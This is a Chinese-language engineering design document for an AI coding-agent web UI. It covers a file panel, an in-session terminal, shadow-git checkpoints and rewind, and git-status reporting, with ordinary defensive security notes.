| 组件测试 / E2E | 前端用例几乎全是纯逻辑/逻辑模块（这个项目测逻辑模块而不挂载组件），组件渲染与 E2E 没有自动化覆盖 | M |
| `retry` 提示 | 事件接上了（顶栏一行），但没在真实限流下看过 | — |

### 15.2 待人工验证的界面清单

服务端和纯逻辑都有自动化覆盖，但**界面没有被人眼看过**。这份清单是 W5 的起点：

- [ ] 问一句需要读写文件的问题，看时间线（思考折叠 / 工具调用 / 回答）是否清楚
- [ ] `edit` 的 diff 渲染正确（行号、增删配色、超过 28 行折叠）
- [ ] bash 弹审批卡：**批准** / **拒绝** / **改写后批准** 三条路径
- [ ] 审批卡待决时**刷新页面**：卡还在、倒计时接着走
- [ ] 运行中刷新：已有内容还在、继续实时更新
- [ ] 运行结束后刷新：界面不卡在「运行中」（雷区 2）
- [ ] 往上翻历史时不被拉回底部；回到底部后恢复跟随
- [ ] 限轮 auto 到期提示、PolicyPicker 的橙色 auto 态与剩余轮次
- [ ] 两个标签页开同一会话：都能看到同一份流；A 页在跑时 B 页发送被拒
- [ ] 长 bash 输出（几千行）时页面是否还流畅
- [ ] 文件面板：树展开/折叠不丢状态、预览（代码高亮 / 图片 / md 预览切换 / 二进制拒显）、⌘P 搜索打开
- [ ] 面板内编辑：改几行保存；另开编辑器动同一文件再保存 → 409 冲突条 → 覆盖/放弃两条路径
- [ ] 改动 tab：本会话按轮分组、统一/双栏切换、工作区累积 diff、清空基线两步确认

---

## 16. workspace 文件面板（M1–M5 已全部落地）

右上角按钮打开右侧滑出面板（镜像左侧栏的收起机制），GitHub 式文件管理 + Codex 桌面版式改动可视化。设计前有竞品实据调研（Codex 开源仓库 app-server 协议、Claude 桌面版 checkpointing 文档），关键决策的记录：

> **这条决议的边界后来变了一次，读之前先看清：** 它管的是**改动追踪**，那件事到今天仍然不碰 git。而**整树快照**（checkpoint / 撤回）后来走了 git 的路——见 §18.2，那里解释了为什么这不是反悔而是两件事。

**单一改动数据源，不碰 git。** Codex 的双轨制（`git diff` 整体视图 + `TurnDiffTracker` 内存快照）会因两者对不上而被报 issue（openai/codex#31157）；Claude 的 checkpoint 是 Edit/Write 前的**内容快照**（`~/.claude/file-history/`，按 prompt 分组、留 100 个、resume 可用），明确不依赖 git。pogo 走快照路线：改动追踪 = edit/write 的 details（事件流和会话文件里都有）+ 累积基线靠 file journal（M4，edit.go/write.go 读原文处插 `BeforeChange` 钩子）。

**watcher 不做。** Codex 的 fs/watch 是它 issue 最密集的区域（不刷新、卡死、百万 inotify watch），且引入 fsnotify 违反 stdlib-only。刷新 = SSE `tool_end` 事件驱动（agent 改的自己看得见）+ 手动刷新按钮；外部编辑器改动不追（Claude 同样声明 "External changes not tracked"）。

**side-by-side 走 patch 文本。** DiffView 吃的是 Go 预渲染的折叠单栏文本，行号/省略行已丢对齐信息，救不回双栏；但 `details.patch`（git 标准 unified，有 `TestUnifiedPatchAppliesWithGit` 背书）一直在 wire 里。前端写一个 patch→rows 解析器（hunk 结构照 Claude SDK 的 `structuredPatch` 命名），per-edit 卡片和工作区累积共用一份。

**raw 预览只放 image/*。** 内容端点与页面同源，若原样吐出 HTML 就能以页面身份读到 sessionStorage 里的 token——`raw=1` 因此只服务嗅探为 `image/*` 的响应并带 `nosniff`，其余 415。

**大 diff 限制渲染不限制导航**（Codex #25137 的教训）：文件列表永远完整，超大 diff 退化为统计行。

**里程碑**：M1 只读 API（✅ 本节三个 `/api/files*` 端点 + `tools.Resolve` 导出 + 测试）→ M2 面板+树+预览（✅ `FilesPanel.vue`/`FileTree.vue`/`FilePreview.vue`：顶栏文件夹按钮开合（开合态如今持久化在 `pogo:active-sheet`，旧的 `pogo:files-open` 仅作 legacy 读取）、宽度拖拽（如今持久化的是拆分**比例** `pogo:files-ratio`——侧栏收起或窗口缩放都要保住这个比例；旧的像素键 `pogo:files-width` 被主动删除）、懒加载树（listings/展开态在 `fileTreeStore.ts` 模块级，折叠不丢）、整面板切换预览（文本走 CodeBlock、图片走 raw、md 有预览/源码切换、二进制拒显））→ M3 会话改动 tab（✅ `ChangesView.vue` + `agent/changes.ts`：纯前端从 timeline 按「第N轮」聚合，零 Go 改动；create/edit/delete 徽标 + ±统计 + 每文件逐次 diff 卡片（新建文件的 write 也带统计——每行都算新增，`write.go` 对 created 也跑 `diff.Stat("", content)`）；统一/双栏切换——双栏由 `agent/patch.ts` 把 `details.patch` 解析成对齐行，`SideBySideDiff.vue` 渲染；解析器测试的 fixture 是 Go `diff.Unified` 的真实输出）→ M4 journal + 工作区累积 diff + side-by-side（✅ `tools/journal.go`：`DirJournal` 按 cwd 作用域存首次改动前的 pre-image（单文件 >1MB 只记统计、总量 256MB LRU 淘汰、tmp+rename 原子写、`ForSession(sid)` 归属），edit/write 在文件锁内读完原文后调 `BeforeChange`；manager 每服务器一个 journal、逐会话注入；`/api/workspace/changes|diff|journal/clear` 三个端点，bash 删除的文件显示为 D、内容被还原的自动消失；前端改动 tab 加「本会话/工作区」作用域切换，工作区累积 diff 与 per-edit 共用同一个 patch→rows 双栏，「清空基线」是两步内联确认不是 modal；工作区列表跟随本会话的 tool_end 自动刷新）→ M5 面板内编辑 + quick open（✅ `PUT /api/files/content`：mtime 乐观并发（409 带 current_mtime_ms）、同目录 tmp+rename 原子替换并保留权限位、保存过 journal 进工作区改动集、二进制/NUL 拒绝、截断文件不给编辑（截断内容写回等于悄悄截肢）；FilePreview 编辑模式 409 → 覆盖保存/放弃修改两选；`QuickOpen.vue` + `agent/fuzzy.ts`：⌘P/Ctrl+P 只在面板打开时拦截，子序列匹配（连续命中 + 段首加权、同分短路径优先、前 50 条），索引首次打开时拉取、刷新即失效）。**M1–M5 全部落地**。

**已知边界**（与两家竞品一致）：bash 命令改动、外部编辑器改动不进改动集；状态只有 create/edit（edit/write 删不了文件）；subagent 子进程的改动默认不进 journal（M4 时曾尝试把它接进委派运行，没有成功，维持此声明；`tools/journal.go` 顶上的边界声明仍在）。

**文件类型图标**（`fileIcons.ts`，文件树/QuickOpen/改动列表共用）：图标数据用 vscode-icons 全集（Iconify JSON 的 `file-type-*` 系列，图标数量随依赖版本漂移，不写死），`?raw` 内联成字符串、模块加载时 `JSON.parse` 一次——不走 JSON module 是因为 vue-tsc 会给 3.6MB JSON 生成字面量类型直接拖垮构建，且运行时才决定查哪个图标也无法 tree-shake。解析顺序：特殊文件名（Dockerfile/go.mod/.gitignore/各 lock 文件…）→ `.env*` 与 `prettier/eslint/vite.config…` 等包含规则 → 扩展名别名（ts→typescript、pdf→pdf2、dart→dartlang…）→ `file-type-<ext>` 直查 → 类别组（图片/音频/视频/压缩包/字体/二进制）→ `default-file`。文件夹不用 vscode-icons 的褐色，统一用内联的 flat 黄色文件夹（flat-color-icons 的两个 SVG body，#FFA000/#FFCA28），目录名颜色也不再染蓝。

---

## 17. 会话内终端（pty）

`GET /api/sessions/{sid}/terminal` 升级成 websocket，接一个跑在**该会话工作目录**里的交互式 shell（`exec.Command(shell)`，不带 `-l`，不是登录 shell）。它回答的是文件面板回答不了的那半个问题：agent 在改我的文件，让我自己也去那个目录里敲两条命令。

浏览器终端使用 `creack/pty` 开 pty、`nhooyr.io/websocket` 传帧；这不是当前 Go 项目唯一的第三方依赖来源。CLI 的 `tui/` 是另一个显示入口，其退役不会自动移除这里的 PTY/WebSocket，见 [平台化取舍](tui-platform-direction.md)。

**帧只有一种形状**，两个方向共用：`{type: "in"|"out"|"resize"|"exit", data?, cols?, rows?, code?}`。`data` 是原始终端字节，以 JSON 字符串承载——UTF-8 安全，不付 base64 的税。

### 17.1 shell 的寿命属于会话，不属于连接

关标签页、切会话、网络抖动都只是 detach。下一次 attach 会**重放 backlog 环**，所以一个跑了一半的 `make` 回来时还在滚。shell 只随会话消失（淘汰 / 删除 / 关服务）或用户自己敲 `exit`——之后下一次 attach 会开一个新的。

这条和 §7.1 的「运行的寿命属于会话」是同一个决定的第二次应用：**发起和订阅解耦之后，长期存在的东西就都不该挂在连接上。**

- **backlog 上限 256KB。** 几屏噪声很大的构建输出都装得下；再多客户端自己有 scrollback。
- **同时只有一个视图。** 第二个客户端 attach 会把第一个踢掉（`StatusGoingAway`，理由 "replaced by a newer view"）。最新那个窗口才是用户真正在看的那个；两个视图共享一个 pty 只会互相打断彼此的输入。
- **重放先于实时。** attach 的第一件事是把 backlog 写出去，这样重绘落在新输出**下面**而不是后面。
- shell 取自用户自己的 `$SHELL`；`$SHELL` 未设时**优先 `/bin/bash`、再退 `/bin/sh`**。容器里 `$SHELL` 几乎必然未设（没有登录 shell 设它），所以这个硬编码回退决定面板打不打得起——代码注释里记着当初的教训：默认 zsh 时它在 Debian/Alpine 官方镜像里不存在，`startTerminal` 直接报 "no such file"，面板永远 attach 不上。环境原样继承，只额外设 `TERM=xterm-256color` 和 `COLORTERM=truecolor`。比这更少都会让它在用户已有的终端旁边显得是坏的。

### 17.2 并发面

四把锁，各自守一件事，命名上写清了为什么不能合：

| 锁 | 守 | 为什么单独一把 |
|---|---|---|
| `wmu` | 写 pty | 击键和 resize 会在另一个 goroutine 重放 backlog 的中途到达 |
| `cmu` | 写连接 | pump 和 backlog 重放会交错帧，而 websocket 库禁止这样 |
| `backlogMu` | 环缓冲 | pump 是唯一读者也是唯一写者，但 attach 要拷一份 |
| `mu` | 附着关系与尺寸 | **读循环和 Kill 都不碰它**，所以一个慢客户端永远不会阻塞输出 |

`detach` 只在「附着还是自己那一个」时才摘除：一个替换进来的连接，不能被它替掉的那个连接先跑完 defer 给摘掉。

### 17.3 关闭时杀进程组

`Kill` 关 pty master（让 pump 失败）、然后 `syscall.Kill(-pid, SIGKILL)`。**杀组不是杀进程**：shell 启动的 dev server 是它的进程组成员，只收割组长会把它们变成孤儿被 init 收养。这和 `tools/procgroup_unix.go` 里取消一轮 bash 的处理是同一条规则、同一个理由。

### 17.4 安全

**这一节把 §8.1 的话说完了：一个未加认证的实例等于把 shell 作为服务开放出去。** token 中间件像管其他 `/api` 路由一样管住升级请求，Origin 中间件在升级之前就已经跑过（所以 `websocket.Accept` 不需要再查一遍）。

而**闸门在这里完全不在场**，这是有意的：闸门管的是模型，这个 shell 是用户自己的手。`bash` 工具本来就没有路径限制（§8.1），这里连那层「防手滑」都没有——它本来就不是给模型用的。

---

## 18. 撤回（rewind）与 checkpoint

时间线上任何一条**用户消息**都可以撤回。`rewind` 有三档（`chat` / `files` / `both`，`web/checkpoint.go` 的 `RewindMode`；三档与按文件选择的由来见 §18.7），`rewind_preview` 用来在问人之前把代价算出来。

### 18.1 对话：分叉，不是删除

撤回把那条消息、回答它的每一轮、以及之后的一切，都变成**从 head 不可达**。transcript 是 append-only 的，所以什么都没有被删除——旧分支还在文件里，只是没有人从 head 走得到它。

**附件是例外：字节会被清掉。** 撤回把被撤消息还原成发送前的草稿（文本回填输入框，附件在前端取回字节后变回本地 chip），所以工作区里那份「只被遗弃分支引用」的 uploads/ 副本没有任何活着的引用方——fork 之后 `gcRewoundUploads` 把它删掉，规则与 Delete 相同：存活分支还在用的留下，同工作区别的会话提到的留下（`uploadRefsElsewhere`），ledger 同步剔除，`.cache` 里可再生成的派生项扫掉。前端在 `rewound` 事件里清空并重拉本会话文件列表（`refreshUploads` 的 union 语义只增不减，不清空就会留幽灵），文件树走同一个防抖失效信号。

**运行中不允许撤回**（`ErrRunActive`）。否则 loop 会继续往一条没人看得见的分支上追加。

### 18.2 文件：影子 git 仓

对话之外可以要求把工作区**恢复到那条消息发出时的状态**：改过的回去、删掉的回来、之后新建的被移除。做法是每次 run 开始前对整个工作树打一次快照，存进一个**影子 git 仓**。

**这和 §16「单一改动数据源，不碰 git」不矛盾，但必须讲清边界，否则读起来像反悔。** §16 那条决议管的是**改动追踪**——「这次会话改了哪些文件、每处 diff 是什么」——那件事到今天仍然不碰 git，数据源是 edit/write 的 details 加 file journal。checkpoint 要的是另一件事：**整棵树在某一时刻的样子**。而那件事上快照路线反过来赢了，理由是 §16 自己「已知边界」那一段承认的两个洞：

> bash 命令改动、外部编辑器改动不进改动集

一份整树快照恰好能抓住 per-file 钩子抓不到的东西：bash 写的、删除、重命名。所以两件事用了两种机制，而不是一件事改了主意。这也是市场收敛的位置——Codex 的 ghost commit、Gemini CLI 的 `~/.gemini/history`、Cline 的 per-task 影子仓，都是整树快照。

四条实现约束：

- **影子仓在会话目录下，永远不在工作区里**（`<session-dir>/checkpoints/<项目键>/`，bare 仓 + `--work-tree` 指向工作区）。两个后果都是要的：**工作区不需要是 git 仓库**，而如果它是，**用户自己的 git 历史一个字都不会被碰**。
- **checkpoint 用 run 开始那一刻 transcript 的 head 记录 id 命名**（`refs/checkpoints/<recordID>`）。而撤回的分叉点恰好就是这样一个记录 id——**这就是两棵树的连接键**：对话在 JSONL 里分叉，影子分支在这里分叉。没有第二套 id 需要对齐。
- **失败模式永远是「不可用」，绝不是「阻塞」。** 没有 git、目录不可写 → `NewShadowRepo` 返回错误，checkpointing 关掉而不是服务器起不来；某个点的快照没落上 → 那个点只能撤对话，`errFilesUnavailable`。**run 从不因为快照失败而不跑。**
- **一个 index 只能有一个写者**，所以所有改动型操作在 `mu` 上串行，并发会话排队而不是把 index 弄坏。

### 18.3 恢复要预览并询问，不猜

快照分不清「agent 改的」和「checkpoint 之后用户自己改的」。所以 `rewind_preview` 先跑一遍 `git` 的 name-status，把要动的文件列出来：

| Status | 含义 |
|---|---|
| `M` | 恢复 |
| `D` | 找回（被删掉的回来） |
| `A` | 删除（checkpoint 之后新建的） |

`Added`/`Removed` 是**这次恢复本身**会增删的行数——和 Status 描述的后果对齐，不是那次改动的行数。二进制文件报 `-1`，界面显示「二进制」而不是编一个行数。对话框明说：**之后新建的文件会被删除，这之后你手动的改动会被覆盖。**

### 18.4 全有或全无

> **这条的边界后来被讲清楚了一次，读之前先看清：** 「全有或全无」管的是**一次撤回内部**不会做一半——它从来不是「两半必须一起要」的意思。三档模式与按文件选择见 §18.7。

`Restore` 先跑、`Fork` 后跑，**同一把锁**。所以恢复失败就完全不动对话，而且中间没有缝隙能让一次 run 挤进来。

`reset --hard` 之后还要跟一个 `clean -fd`：reset 不管未跟踪文件，而被放弃的那次 run 新建的文件正是未跟踪的——**放过它们的撤回只撤了一半**。被 ignore 的路径留着，那正是 ignore 它们而不是删掉的意义。

影子分支随恢复一起回退，所以之后的 checkpoint 从恢复后的状态分叉——和 transcript 的分叉对上。

### 18.5 快照的预算与撤回点的保留期

前面四节讲的是**一次**快照怎么打、怎么恢复。这一节讲**总量**：一次快照可以多大，总共留多少个。这两个数在 18.1–18.4 落地时都没有答案，而「没有答案」在这里的实际含义是**无界**——每次 run 开始打一次快照、`--allow-empty` 保证 ref 一定前进、且没有任何代码删过 ref。会话被淘汰也不会带走它的 checkpoint。

竞品都给了界：Claude Code 每会话留 100 个快照 + 30 天保留期（`cleanupPeriodDays` 可调），Codex 留最近 15 个 managed worktree（删除前先存快照），Cursor 干脆不跨 IDE 重启保留。

**体积预算：512MiB 新增内容 / 2 万个新文件。** 超了**不打快照**——run 照跑，stderr 报出最大的几个目录。三个决定：

- **判断交给 git，不自己走目录树。** `git ls-files --others --exclude-standard` 列出的正是 `add -A` 会 stage 的东西，它同时尊重工作区的 `.gitignore`、每一层嵌套的 `.gitignore` 和影子仓的 `info/exclude`。自己走一遍的版本会在一个 2GB 的构建目录上关掉 checkpoint，而 git 本来就要 ignore 它——把「预算」变成「误报」。
- **只量未跟踪的路径。** 已跟踪的内容已经付过了，重新量它会把一次性的拒绝变成永久的拒绝。
- **量不出来不算超。** `ls-files` 失败时放行：预算是防磁盘开销的护栏，不是安全前提。这和 18.2「失败模式永远是不可用、绝不是阻塞」是同一条规则的第二次应用。

诊断必须点名最大的贡献者（按顶层条目聚合），因为那是人能动手的单位——一条 `.gitignore`、一次目录搬迁。只报一个数字等于让人无从下手。

**噪声清单是 `indexSkip` 的超集，不是同一份。** 两份清单回答的是不同问题：索引那份问「这会不会在 quick open 里淹掉项目自己的文件」，这份问「每次 run 快照它要花多少真实磁盘」。所以包管理器目录与工具缓存加在这边。

**`build/` 和 `target/` 故意不加。** 两个都是约定的产物目录，也都在某些项目里是手写源码，而猜错的代价是**静默**的：一次撤回跳过了一个没人被告知的文件。名字只在「这个名字永远不是源码」时才配进清单；剩下的交给体积预算——**用量的，不用猜的**。

**保留策略：100 个撤回点或 30 天，先到先算。** 由 `-checkpoints-prune` 执行，**做成命令而不是后台定时清扫**——和 `-worktrees-prune` 同一个理由，那条理由写在 `worktrees.go` 顶上：pogo 没有常驻进程，两次调用之间什么都不跑，所以诚实的选项只有「有人来问的时候」和「永不」；定时清扫意味着在一次无关的 run 里删掉别人的撤回点。Claude Code 和 Codex 能定时扫是因为它们长驻。

保留的数字**不做成 flag**。一个旋钮需要有被转动的理由，而「一百个点或三十天」对每个项目都是同一个答案。等有人拿出一个能证伪它的工作区，再加那个 flag。

**清理必须重写幸存者，否则一个字节都释放不出来。** 这是最容易做错的一半：每个 checkpoint 提交都以前一个为父，**分支把整条链拴在一起**。删掉旧 ref 之后，某个更新的提交仍然把它列为祖先，对象照样可达，`gc` 什么也不会丢。所以 prune 在同样的 tree 上重建一条新链——**ref 名不变，commit id 变**——之后 `gc --prune=now` 才真的能丢掉只有被删除的点引用过的对象。`refs/heads/main` 必须跟着走，否则被放弃的旧链从分支这一侧仍然可达；幸存者为零时直接删掉分支，下一次 run 从头开一条历史，它快照的工作树两种情况下都是同一个。

改 commit id 是安全的，而这一点正是 18.2 那条设计撑起来的：**和 transcript 的连接键是 ref 名，不是 commit id**，`Preview` 和 `Restore` 每次都重新解析这个名字。

**排序不能用提交时间——这是实测踩到的坑，不是推演。** git 时间戳只有秒精度，六个连续的 checkpoint 会带着同一个 `committerdate`，`--sort=-committerdate` 于是静默退化成按 ref 名排序：`keep=2` 保留了 `rec0`、`rec1`，丢掉了 `rec4`、`rec5`——保留策略的精确反面，而且输出里的「removed 4, kept 2」看起来完全正常。真正的顺序是提交链本身（每个 checkpoint 以前一个为父），`rev-list --all --topo-order` 保证子提交排在父提交之前，一次调用就给出覆盖所有撤回点的全序，包括被某次恢复放弃在旁支上的那些。年龄规则用 `<=` 而不是 `<`，同一个秒精度的理由。

**顺带被这套设计免掉的一类事故。** 18.2 说的是「不碰用户的 git 历史」，还可以说得更硬：影子仓是 `--git-dir` + `--work-tree` 的 bare 仓，**从不碰工作区的 `.git`**。Cline 的 checkpoint 为了打快照会把工作区的 `.git` 临时改名成 `.git_disabled`，进程被中断或崩溃时没改回来，于是损坏用户仓库、submodule 报错（cline/cline#4388）。那一整类事故在这里不存在，不是因为处理得好，是因为没有那一步。

### 18.6 真 git 的状态：显示给人，也告诉模型

§18.1–18.5 全都是影子仓——**「撤回最近几轮」**。它有意不碰用户自己的历史。但另一半问题一直没有任何人回答：**这是哪个分支、有没有提交过、这里到底有没有版本控制。**

这不是假想的缺口。写这一节的时候，pogo 自己的仓库里有 **136 个文件未提交**（其中 120 个 untracked，包含 starters、dock hub、面板桥、mermaid 渲染的全部产出），躺了好几天，**一次 `git clean` 就会全部消失**；而 UI 上没有任何一处提到过 git，`grep -r git web/ui/src` 只命中 `.gitignore` 的文件图标和几条注释。同期 malagent 整个项目根本不是 git 仓库。两件事的共同点是：**没有任何界面说过一句话。**

竞品全都做了这件事：Claude Code 把 git 状态注入系统提示，Codex 的 review pane 直接把仓库当第一等对象，**项目不是仓库时会提示你创建一个**。这一节抄的是它们的结论，避开的是它们 issue 里的两个坑。

**为什么这和 §16「单一改动数据源，不碰 git」不矛盾。** §16 管的是**改动追踪**——「这个 agent 从它自己的基线以来改了哪些文件」——数据源是 edit/write 的 details 加 file journal，那件事到今天仍然不碰 git。这一节管的是**另一个问题**：「这些改动提交了吗」。两者互不包含，也互不喂给对方：git 状态一个字都不会进改动列表。§16 那条决议的边界因此没有变——只是旁边多了一条独立的信息。

三条实现约束：

- **报数量，绝不报内容。** 改动的文件列表是无界的，而这正是同一个功能在 Claude Code 那边变成每轮上万 token 的原因（anthropics/claude-code#8245，而且当时关不掉）。数字回答的是人和模型真正在问的那个问题（「提交了没有」），文件列表下面那块面板本来就有。**副产品是 prompt section 的大小由构造保证有界**，所以既不需要 token 预算，也不存在能把它撑大的仓库——唯一的自由文本是提交标题，按 rune 截断到 72。
- **绝不猜主干分支。** 需要「对着基线分支 diff」时才需要知道主干是哪个，而 Claude Code 的主干检测会把当前特性分支误判成主干（anthropics/claude-code#16767）。这一版干脆不做这件事：`branch.upstream` 与 ahead/behind 由 `--porcelain=v2 --branch` 免费给出，是同一个问题更准确的答案。
- **仓库根要报出来。** 它不总是工作区。会话起在高了一层的目录上，会静默地报告父仓库的状态，而这是真实发生过的困惑（anthropics/claude-code#5718、#81726）。tooltip 里带着根路径，是人唯一能发现这件事的途径。

**一次调用拿到全部。** `git status --porcelain=v2 --branch` 同时给出分支、上游、ahead/behind 和每一条改动项；v2 是有稳定性承诺的机器格式（短格式明确没有）。未跟踪文件保持 git 默认的目录折叠而不是 `--untracked-files=all`，理由是**要和用户自己终端里 `git status` 报的数字一致**。提交标题另花一次 `log -1`：「我在哪个提交上」由消息回答远比七位十六进制有用。

**`GIT_OPTIONAL_LOCKS=0` 不是优化。** `git status` 正常会刷新索引并占用它的锁，而这段代码运行的时候用户可能正在同一个 checkout 里敲 git。**一个会让别人的提交失败的状态显示，比没有状态显示更糟。**

**失败一律是可渲染的状态，端点永远 200。** 没有仓库、没有 git 二进制、探测超时，三者都是要显示的状态而不是要处理的错误——和 checkpoint 同一条规则。一个因为「这个目录不是仓库」而弹错误提示的面板，是把这两件事里哪一件不寻常搞反了。

**「没有版本控制」是唯一上色的状态**，因为它是唯一一个人可能不知道自己身处其中的状态。其余（脏、游离、未提交 500 项）都是人自己选的，一律灰字。

**提示注入可关，但显示面不跟着关。** `-no-git-context` 管的是**告诉模型什么**；面板是**给人看的**，一个为了省 token 关掉注入的人并没有要求从此看不见自己的分支。所以 `Manager.GitStatus()` 不看这个开关。

**注入按会话探测一次，不是每轮。** 系统提示中途变化会让缓存前缀每轮失效；但服务跑了一小时之后新建的会话，应该看到仓库此刻的样子而不是启动时的样子。每会话一次同时满足这两条。模型自己看得见它刚提交了什么，为此每轮多花一个子进程去告诉它它刚做过的事是不值得的。

**不主动 `git init`。** 非仓库时 prompt section 明确写了「如果用户的工作值得纳入版本控制，说一次就够；不要在没被要求的情况下初始化仓库」。Codex 桌面端是**提示**你创建，它的 CLI 则是不在仓库里就拒绝启动（`--skip-git-repo-check`）——后者这一版不抄：pogo 的影子仓让非 git 目录照样能撤回，拦下来反而是自降能力，而这正是 Codex 因此被批评的地方（openai/codex#19205 说 undo 不该依赖版本控制）。

**UI 落在文件面板 header 下面单独一行**，不是 header 里再加一个 chip：header 已经是两个 tab 加四个按钮，而这一行是那里唯一一个**属于工作区而不属于面板**的东西。刷新有两个触发点，都表示「文件可能动过了」：手动刷新按钮，和一次 run 结束（`indexEpoch`，stream 本来就会因为 agent 可能新建了文件而把索引作废）。**故意没有轮询**——定时器会让一个闲置标签页永远在跑 git 子进程。

标签与 tooltip 的组装抽到了 `components/gitBar.ts`（和 `dockSheets.ts`、`followups.ts` 同一个形状、同一个理由：这个项目的 UI 测试测逻辑模块而不挂载组件）。翻译函数是参数而不是 import，所以测试可以传一个把 key 原样回显的实现——**断言结构而不是文案，改措辞就不会挂测试。**

#### 18.6.1 提交这件事：pogo 不写你的仓库，但会告诉 agent 哪些改动不是它的

**先说被推翻的前提。** 原计划里有一条「加一个提交端点 + 提交按钮」。核对之后不成立：`policy.go` 的默认档 `ModeStandard` **只审 bash**，而 bash 没有路径限制，所以**模型今天就能提交，而且每一次都已经经过人工审批**——闸门弹出、人看到完整命令、人点批准。再加一个写端点只是给已有能力换个入口，还多一条要保护的写路径。所以不做。

**归属（`Co-Authored-By`）刻意不做，这是决定而不是遗漏。** 依据是这件事在上游仍然有争议，而且做错了清不掉：

- Claude Code 有两个仍开着的 issue：anthropics/claude-code#47218「系统提示强制把 Co-Authored-By 塞进每个提交，无法关闭」、#47579「未经同意加入，永久修改了用户的 git 历史」。两者都**晚于** `attribution` 配置项的引入——也就是配置关掉了、提示词又加回来。
- 后果实际不可逆：GitHub 的 contributor 图统计 co-author 且是**缓存**的，改写历史之后 AI 仍然挂在贡献者里（community#191565、#197389），以至于有专门的清理工具（PyPI 上的 `declaude`）。GitHub 另有一个「AI contribution attribution」仓库开关会凭自己的检测再加一个 AI 贡献者（community#188915）。
- 上游政策在分裂：Linux 内核直接**禁止 AI 生成的提交信息**，理由是保住「历史里的推理属于人」；GCC 与 Kubernetes 各走各路。

**一个默认写进别人 git 历史、事后清不干净、且上游还没收敛的东西，正确的动作是不写。** 需要归属的部署方配 `commit.template` 或一个 hook 就能拿到，那是他们的仓库该做的决定，不是基座该替他们做的。

**真正的缺口只有一个，而它闸门盖不住。** `git add -A` 会把用户自己还没提交的工作扫进 agent 组装的提交里。闸门给人看的是 `git add -A && git commit -m "…"`——**那是命令，不是它将要暂存的清单**，所以人在闸门上无法发现这件事。Aider 的解法是先把脏文件单独提交掉，但那要主动写用户的仓库。这里取更便宜的一半：**在会话开始那一刻把已经脏的路径记下来并告诉模型「这些不是你的」**，然后什么都不写。

这是 §18.6「报数量绝不报内容」的**唯一例外**，理由是这条规则用数字表达不出来——「不要暂存你没改过的」必须说出是哪些。所以它有硬上限（20 条 + 「另有 N 个」），只在会话开始探测一次（**按定义，agent 之后做的任何事都不可能加入这个集合**），并且未跟踪目录保持 git 的默认折叠：`恶意代码/` 这样一条对「不要暂存它」来说完全够用，展开可能是几千行。

因为要读路径了，status 调用补上了 `core.quotepath=false`——git 默认会把非 ASCII 路径八进制转义，那正是 CJK 文件名变成 `\346\265\213…` 的原因。影子仓当初是踩了同一个坑才学到的。

**通用纪律进的是基座提示词，不是 git 段落**，因为它不依赖任何 git 事实、也应当在 `-no-git-context` 关掉之后依然生效：「提交时暂存你改过的路径而不是全部，永远不要用 `--no-verify` 绕过 hook，不要 amend / reset / force-push 改写历史」。一句话，接在原有那句「不要删文件、不要 reset 版本控制」后面——同一处、同一语气。hook 那半句是有实据的：pre-commit 失败极常见，而危险不在单次（闸门会让人看见 `--no-verify`），在于模型**学会**把绕过当成标准解法；anthropics/claude-code#82624 是同一类的极端案例，一个 git 检查 hook 的补救措施会去改写本来正确的提交，而检查永远不可能通过，于是无限 amend。

**签名没有额外处理，这也是一个决定。** `commit.gpgsign=true` 时 agent 发起的提交可能卡在 pinentry 上或直接失败（claude-code#18715 是相关变种：改 `GIT_AUTHOR_NAME` 会导致签名验证失败，因为那个环境拿不到密钥）。但既然提交是模型经 bash 发起、由人在闸门上批准的，失败就出现在人正看着的那次工具调用里——**基座不该替一个它没有发起的操作猜怎么补救**，而这一节前面那条「不要 amend」正是防止它自己去猜。

### 18.7 三档撤回与按文件选择

**这一节和 §18.4「全有或全无」不矛盾，但必须讲清边界，否则读起来像反悔。** §18.4 那条说的是**一次撤回内部**不会做一半：`Restore` 失败就完全不动对话，中间没有缝隙让 run 挤进来。它从来没有说过「对话和文件必须一起撤」。这一节做的正是把**两半分别可要**，而 §18.4 的原子性在每一档内部照旧成立。

**原来只有两档，而且缺的那一档是结构性的。** `Rewind(messageID string, files bool)` 里 `Fork` 是无条件执行的，所以只能「文件+对话」或「只对话」，**没有「只恢复文件」**。UI 侧 `rewindMode` 就是 `"both" | "chat"`。Claude Code 的 rewind 菜单三档齐全（代码+对话 / 只对话 / 只代码），Roo 的恢复对话框两档且 files-only **明确不需要确认**。

**这一档服务的场景很具体：这一轮的思路有用、但改动改坏了。** 这在 agent 使用里是常态——推理过程值得留在上下文里，产出不值得留在磁盘上。把它当成「both 的弱化版」会错过这一点：它不是少做了一件事，是做的**另一件事**。

**为什么这样做是安全的，理由和 §18.5 的 prune 是同一条。** files-only 之后影子分支回退了、transcript 没有分叉，两棵树的形状从此不再互为镜像。这不影响任何东西，**因为 checkpoint 用 ref 名寻址、每个 ref 都能独立解析**——链的拓扑对正确性不起作用。18.5 重写幸存者时依赖的是同一个事实。

**按文件选择，而不是逐行立即执行。** 撤回对话框已经把受影响文件逐个列出来了，所以最初的想法是每行加一个「恢复这一个」按钮。但那会让一个**确认对话框**在你按主按钮之前就产生不可逆副作用——两种交互模型混在一起。改成每行是一个勾选：默认全选，点一行把它排除，主按钮仍然是唯一会动手的东西。这样「只恢复这一个文件」就是「取消勾选其余的」，同一个原语覆盖两种诉求。

**记录的是排除项，不是包含项。** 预览可能晚到、也可能刷新，而以排除项为状态意味着**新出现的文件天然是被选中的**——对恢复而言这是更安全的默认，也和按钮上写的话一致。被排除的行仍然留在列表里（灰掉 + 删除线），因为「我到底漏掉了哪几个」是事后才会问的问题，消失的行回答不了它。

**`RestorePaths` 有意不移动影子分支**，`Restore` 会。区别就是这一点：全量恢复之后的 checkpoint 从恢复点分叉、和 transcript 的分叉对上；部分恢复之后工作树处于**没有任何 checkpoint 描述过的状态**，那正是「把这一个文件放回去」的含义。下一次 run 的 checkpoint 照常快照当时的样子，所以下游不需要分支动过。

**路径守卫用项目自己的 `tools.Resolve`**，不在这里另写一套：什么叫「在工作区内」只应该有一个地方定义，而撤回不是重新回答它的地方。

**`files` bool 换成 `mode` 字符串，是一次刻意的破坏性改动。** bool 表达不了第三种状态，而唯一的客户端就是同一个二进制里内嵌的那个 UI。**没有默认值**：撤回是破坏性操作，「猜你想撤哪一半」恰恰是默认值最危险的地方，所以缺失或未知的 mode 一律 400。控制端点的 `mode` 键同时被 `set_policy` 用着——那个结构体本来就是「按 action 解释的扁平袋子」（`Turns`、`AllowTool` 也是这么共享的），两者永不同时出现。

